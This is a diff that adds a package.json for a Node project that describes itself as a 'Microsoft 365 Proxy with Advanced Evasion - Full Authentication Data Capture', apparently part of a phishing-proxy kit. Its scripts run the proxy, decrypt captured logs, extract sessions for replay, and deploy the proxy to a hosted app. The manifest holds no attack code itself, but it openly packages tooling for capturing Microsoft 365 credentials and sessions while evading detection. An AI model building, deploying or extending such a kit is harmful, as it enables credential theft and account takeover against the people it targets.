@@ -1,0 +1,37 @@
+{
+  "name": "microsoft-proxy",
+  "version": "4.1.0",
+  "description": "Microsoft 365 Proxy with Advanced Evasion - Full Authentication Data Capture",
+  "main": "proxy_server.js",
+  "scripts": {
+    "start": "node proxy_server.js",
+    "dev": "nodemon proxy_server.js",
+    "extract": "node decrypt_log_file.js",
+    "extract:render": "node decrypt_log_file.js --server https://your-app-name.onrender.com",
+    "extract:local": "node decrypt_log_file.js --server http://localhost:3000",
+    "extract:json": "node decrypt_log_file.js --no-replay --output ./exports",
+    "extract:session": "node decrypt_log_file.js --session",
+    "pm2:start": "pm2 start proxy_server.js --name microsoft-proxy",
+    "pm2:stop": "pm2 stop microsoft-proxy",
+    "pm2:restart": "pm2 restart microsoft-proxy",
+    "pm2:logs": "pm2 logs microsoft-proxy",
+    "build": "npm install --production",
+    "postinstall": "echo '✅ Microsoft Proxy v4.1 installed with Full Auth Capture'",
+    "security:check": "npm audit",
+    "security:fix": "npm audit fix",
+    "clean": "rm -rf node_modules package-lock.json && npm install",
+    "update": "npm update"
+  },
+  "dependencies": {
+    "axios": "^1.6.2",
+    "dotenv": "^16.3.1",
+    "uuid": "^9.0.1"
+  },
+  "devDependencies": {
+    "nodemon": "^3.0.2"
+  },
+  "engines": {
+    "node": ">=16.0.0",
+    "npm": ">=8.0.0"
+  }
+}
